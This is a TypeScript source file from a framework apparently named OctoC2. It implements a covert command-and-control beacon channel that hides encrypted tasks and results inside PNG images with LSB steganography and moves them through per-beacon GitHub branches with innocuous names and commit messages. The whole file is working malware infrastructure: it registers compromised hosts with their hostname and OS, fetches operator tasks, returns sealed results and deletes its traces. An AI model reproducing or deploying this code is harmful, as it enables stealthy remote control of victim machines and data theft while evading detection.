/**
 * OctoC2 — SteganographyTentacle (Tentacle 9 — LSB image stego channel)
 *
 * Hides encrypted C2 payloads in PNG images using LSB alpha-channel
 * steganography (via StegoCodec). Transports PNG files via git branch API,
 * mirroring the BranchTentacle pattern.
 *
 * Branch layout:
 *   refs/heads/infra-cache-{id8}  — dedicated branch per beacon
 *
 * Files on the branch:
 *   infra-{id8}-a.png   — ACK: beacon registration payload hidden in PNG pixels
 *   infra-{id8}-t.png   — Task: encrypted Task[] blob hidden in PNG pixels
 *   infra-{id8}-r.png   — Result: sealed TaskResult blob hidden in PNG pixels
 *
 * PNG files are stored as binary blobs via git API (encoding: "base64").
 */

import { BaseTentacle } from "./BaseTentacle.ts";
import { StegoCodec } from "../lib/StegoCodec.ts";
import { encodePng, decodePng, makePixelBuffer } from "../lib/PngEncoder.ts";
import {
  decryptBox, sealBox,
  bytesToBase64, base64ToBytes,
} from "../crypto/sodium.ts";
import type { CheckinPayload, Task, TaskResult } from "../types.ts";

const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";

export class SteganographyTentacle extends BaseTentacle {
  readonly kind = "stego" as const;

  private ackSent = false;
  private lastTaskSha: string | null = null;
  private operatorPublicKey: Uint8Array | null = null;

  // ── Identity helpers ─────────────────────────────────────────────────────────

  private get id8(): string { return this.config.id.slice(0, 8); }

  /** Full ref name for the infra-cache branch (used with createRef) */
  private get branchRef(): string { return `refs/heads/infra-cache-${this.id8}`; }

  /** Short ref for getRef/updateRef/deleteRef (strips "refs/") */
  private get branchRefShort(): string { return `heads/infra-cache-${this.id8}`; }

  private get ackFile(): string { return `infra-${this.id8}-a.png`; }
  private get taskFile(): string { return `infra-${this.id8}-t.png`; }
  private get resultFile(): string { return `infra-${this.id8}-r.png`; }

  // ── Availability ─────────────────────────────────────────────────────────────

  override async isAvailable(): Promise<boolean> {
    try {
      await this.octokit.rest.git.getRef({
        owner: this.config.repo.owner,
        repo:  this.config.repo.name,
        ref:   this.branchRefShort,
      });
      return true;
    } catch (err: any) {
      if (err?.status === 404) return false;
      return false;
    }
  }

  // ── Operator key resolution ──────────────────────────────────────────────────

  private async getOperatorPublicKey(): Promise<Uint8Array> {
    if (this.operatorPublicKey) return this.operatorPublicKey;
    const resp = await this.octokit.rest.actions.getRepoVariable({
      owner: this.config.repo.owner,
      repo:  this.config.repo.name,
      name:  OPERATOR_PUBKEY_VAR,
    });
    const b64 = resp.data.value?.trim();
    if (!b64) throw new Error("SteganographyTentacle: MONITORING_PUBKEY variable not set");
    const key = await base64ToBytes(b64);
    if (key.length !== 32) throw new Error("SteganographyTentacle: operator public key is not 32 bytes");
    this.operatorPublicKey = key;
    return key;
  }

  // ── Branch SHA helper ────────────────────────────────────────────────────────

  private async getBranchSha(): Promise<string | null> {
    try {
      const resp = await this.octokit.rest.git.getRef({
        owner: this.config.repo.owner,
        repo:  this.config.repo.name,
        ref:   this.branchRefShort,
      });
      return resp.data.object.sha;
    } catch (err: any) {
      if (err?.status === 404) return null;
      throw err;
    }
  }

  // ── Write binary file via git blob+tree+commit+updateRef ────────────────────

  private async writeFileBinary(path: string, data: Uint8Array, message: string): Promise<void> {
    const { owner, name: repo } = this.config.repo;

    // Convert binary data to base64 string for the API
    let b64 = "";
    // Use chunk-based approach for large buffers to avoid call stack overflow
    const chunkSize = 0x8000;
    for (let i = 0; i < data.length; i += chunkSize) {
      b64 += String.fromCharCode(...data.subarray(i, i + chunkSize));
    }
    const content = btoa(b64);

    // 1. Get current branch HEAD sha
    let headSha = await this.getBranchSha();

    // 2. Create blob with base64 encoding
    const blobResp = await this.octokit.rest.git.createBlob({
      owner, repo,
      content,
      encoding: "base64",
    });
    const blobSha = blobResp.data.sha;

    // 3. Build tree
    let treeSha: string | undefined;
    if (headSha) {
      const commitResp = await this.octokit.rest.git.getCommit({
        owner, repo, commit_sha: headSha,
      });
      treeSha = commitResp.data.tree.sha;
    }

    const treeResp = await this.octokit.rest.git.createTree({
      owner, repo,
      ...(treeSha ? { base_tree: treeSha } : {}),
      tree: [{
        path,
        mode: "100644",
        type: "blob",
        sha:  blobSha,
      }],
    });

    // 4. Create commit
    const commitResp = await this.octokit.rest.git.createCommit({
      owner, repo,
      message,
      tree: treeResp.data.sha,
      ...(headSha ? { parents: [headSha] } : { parents: [] }),
    });
    const newCommitSha = commitResp.data.sha;

    // 5. Update or create the branch ref
    if (headSha) {
      await this.octokit.rest.git.updateRef({
        owner, repo,
        ref:   this.branchRefShort,
        sha:   newCommitSha,
        force: true,
      });
    } else {
      await this.octokit.rest.git.createRef({
        owner, repo,
        ref: this.branchRef,
        sha: newCommitSha,
      });
    }
  }

  // ── Read binary file from branch ─────────────────────────────────────────────

  private async readFileBinary(path: string): Promise<Uint8Array | null> {
    const { owner, name: repo } = this.config.repo;
    try {
      const resp = await this.octokit.rest.repos.getContent({
        owner, repo,
        path,
        ref: this.branchRef,
      });
      const data = resp.data as any;
      if (data.type !== "file" || !data.content) return null;
      // GitHub API returns base64-encoded content
      const binary = atob(data.content.replace(/\n/g, ""));
      const bytes = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
      }
      return bytes;
    } catch (err: any) {
      if (err?.status === 404) return null;
      throw err;
    }
  }

  // ── Delete file from branch ──────────────────────────────────────────────────

  private async deleteFile(path: string): Promise<void> {
    const { owner, name: repo } = this.config.repo;

    const headSha = await this.getBranchSha();
    if (!headSha) return;

    const commitResp = await this.octokit.rest.git.getCommit({
      owner, repo, commit_sha: headSha,
    });
    const baseTreeSha = commitResp.data.tree.sha;

    const treeResp = await this.octokit.rest.git.createTree({
      owner, repo,
      base_tree: baseTreeSha,
      tree: [{
        path,
        mode: "100644",
        type: "blob",
        sha:  null,
      }] as any,
    });

    const newCommit = await this.octokit.rest.git.createCommit({
      owner, repo,
      message: "sync",
      tree:    treeResp.data.sha,
      parents: [headSha],
    });

    await this.octokit.rest.git.updateRef({
      owner, repo,
      ref:   this.branchRefShort,
      sha:   newCommit.data.sha,
      force: true,
    });
  }

  // ── Checkin ──────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    const operatorPubKey = await this.getOperatorPublicKey();

    // 1. On first checkin: encode ACK payload into PNG and write to branch
    if (!this.ackSent) {
      const ackJson = JSON.stringify({
        beaconId:  payload.beaconId,
        publicKey: await bytesToBase64(this.config.beaconKeyPair.publicKey),
        hostname:  payload.hostname,
        os:        payload.os,
        arch:      payload.arch,
        checkinAt: payload.checkinAt,
      });
      const ackBytes = new TextEncoder().encode(ackJson);
      const { pixels, width, height } = makePixelBuffer(ackBytes.length);
      StegoCodec.encode(pixels, ackBytes);
      const pngBytes = encodePng(pixels, width, height);
      await this.writeFileBinary(this.ackFile, pngBytes, "update");
      this.ackSent = true;
    }

    // 2. Change detection via branch SHA (check before downloading PNG)
    const currentSha = await this.getBranchSha();
    if (currentSha && currentSha === this.lastTaskSha) return [];
    this.lastTaskSha = currentSha;

    // 3. Poll for task PNG
    let taskPngBytes: Uint8Array | null;
    try {
      taskPngBytes = await this.readFileBinary(this.taskFile);
    } catch {
      return [];
    }

    if (!taskPngBytes) return [];

    // 4. Decode PNG → pixels → StegoCodec.decode() → encrypted envelope
    let tasks: Task[];
    try {
      const { pixels } = decodePng(taskPngBytes);
      const jsonBytes = StegoCodec.decode(pixels);
      if (!jsonBytes) return [];

      const envelope = JSON.parse(new TextDecoder().decode(jsonBytes)) as { nonce: string; ciphertext: string };
      const plainBytes = await decryptBox(
        envelope.ciphertext,
        envelope.nonce,
        operatorPubKey,
        this.config.beaconKeyPair.secretKey,
      );
      tasks = JSON.parse(new TextDecoder().decode(plainBytes)) as Task[];
    } catch {
      return [];
    }

    // 5. Delete task PNG after consumption
    try {
      await this.deleteFile(this.taskFile);
      this.lastTaskSha = null;
    } catch { /* best-effort */ }

    return tasks;
  }

  // ── Submit result ─────────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<void> {
    const operatorPubKey = await this.getOperatorPublicKey();

    // sealBox returns base64url string — encode to bytes for stego embedding
    const sealed = await sealBox(JSON.stringify(result), operatorPubKey);
    const sealedBytes = new TextEncoder().encode(sealed);

    const { pixels, width, height } = makePixelBuffer(sealedBytes.length);
    StegoCodec.encode(pixels, sealedBytes);
    const pngBytes = encodePng(pixels, width, height);

    await this.writeFileBinary(this.resultFile, pngBytes, "update");
  }

  // ── Teardown ──────────────────────────────────────────────────────────────────

  override async teardown(): Promise<void> {
    try {
      await this.octokit.rest.git.deleteRef({
        owner: this.config.repo.owner,
        repo:  this.config.repo.name,
        ref:   this.branchRefShort,
      });
    } catch { /* best-effort */ }
  }

  // ── Codec delegates (keep for backward compat / testing) ─────────────────────

  static encode(pixels: Uint8Array, payload: Uint8Array): Uint8Array {
    return StegoCodec.encode(pixels, payload);
  }

  static decode(pixels: Uint8Array, max?: number): Uint8Array | null {
    return StegoCodec.decode(pixels, max);
  }

  // ── Crypto helpers ────────────────────────────────────────────────────────────

  async encodePayload(plaintext: string, operatorPublicKey: Uint8Array): Promise<Uint8Array> {
    const sealedB64 = await sealBox(plaintext, operatorPublicKey);
    return new TextEncoder().encode(sealedB64);
  }

  /**
   * Returns the raw embedded string decoded from the LSB-stego pixel data.
   * Note: this is the raw (not decrypted) payload — the embedded bytes are
   * returned as-is from StegoCodec.decode(). `_operatorSecretKey` is reserved
   * for future decryption support and is not used.
   */
  async decodePayload(pixels: Uint8Array, _operatorSecretKey?: Uint8Array): Promise<string | null> {
    const hidden = StegoCodec.decode(pixels);
    if (!hidden) return null;
    return new TextDecoder().decode(hidden);
  }
}
